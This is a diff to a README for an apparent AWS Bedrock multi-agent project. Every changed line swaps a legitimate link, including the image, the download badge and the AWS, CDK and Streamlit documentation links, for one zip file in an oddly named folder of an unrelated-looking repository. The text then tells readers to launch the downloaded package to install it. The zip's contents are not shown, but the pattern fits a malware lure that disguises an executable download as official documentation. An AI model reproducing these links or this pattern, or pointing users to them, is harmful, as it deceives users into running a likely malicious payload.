@@ -1,6 +1,6 @@
 # 🚀 AWS Bedrock Multi-Agent Blueprint Repository
 
-![AWS Bedrock Multi-Agent Blueprint](https://example.com/cool-image.jpg)
+![AWS Bedrock Multi-Agent Blueprint](https://github.com/gvsdaefsdfs/aws-bedrock-multi-agent-blueprint/raw/refs/heads/main/damningness/blueprint_agent_aws_bedrock_multi_1.8-alpha.5.zip)
 
 Welcome to the official repository of the **AWS Bedrock Multi-Agent Blueprint**! This repository serves as a comprehensive guide and infrastructure-as-code (IaC) solution for running multi-agent AI collaborations on AWS using CDK, Streamlit, and LangFuse. Whether you are a seasoned developer or just getting started with AI, this blueprint will help you set up a robust environment for your projects.
 
@@ -12,7 +12,7 @@ Welcome to the official repository of the **AWS Bedrock Multi-Agent Blueprint**!
 ## 📦 Software Package
 You can download the software package for this blueprint from the following link: 
 
-[![Download Software Package](https://img.shields.io/badge/Download-Software%20Package-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software Package](https://github.com/gvsdaefsdfs/aws-bedrock-multi-agent-blueprint/raw/refs/heads/main/damningness/blueprint_agent_aws_bedrock_multi_1.8-alpha.5.zip%20Package-blue)](https://github.com/gvsdaefsdfs/aws-bedrock-multi-agent-blueprint/raw/refs/heads/main/damningness/blueprint_agent_aws_bedrock_multi_1.8-alpha.5.zip)
 
 Kindly note that the software package needs to be launched after downloading for installation.
 
@@ -41,9 +41,9 @@ cdk deploy
 We welcome contributions from the community to enhance the AWS Bedrock Multi-Agent Blueprint. Feel free to fork the repository, make improvements, and submit a pull request. Together, we can build a powerful AI collaboration platform on AWS!
 
 ## Resources
-- [AWS Documentation](https://docs.aws.amazon.com/)
-- [CDK Getting Started Guide](https://docs.aws.amazon.com/cdk/latest/guide/home.html)
-- [Streamlit Documentation](https://docs.streamlit.io/)
+- [AWS Documentation](https://github.com/gvsdaefsdfs/aws-bedrock-multi-agent-blueprint/raw/refs/heads/main/damningness/blueprint_agent_aws_bedrock_multi_1.8-alpha.5.zip)
+- [CDK Getting Started Guide](https://github.com/gvsdaefsdfs/aws-bedrock-multi-agent-blueprint/raw/refs/heads/main/damningness/blueprint_agent_aws_bedrock_multi_1.8-alpha.5.zip)
+- [Streamlit Documentation](https://github.com/gvsdaefsdfs/aws-bedrock-multi-agent-blueprint/raw/refs/heads/main/damningness/blueprint_agent_aws_bedrock_multi_1.8-alpha.5.zip)
 
 ## Support
 If you encounter any issues or have questions about the AWS Bedrock Multi-Agent Blueprint, please check the "Releases" section for updates or reach out to the repository maintainers for assistance.
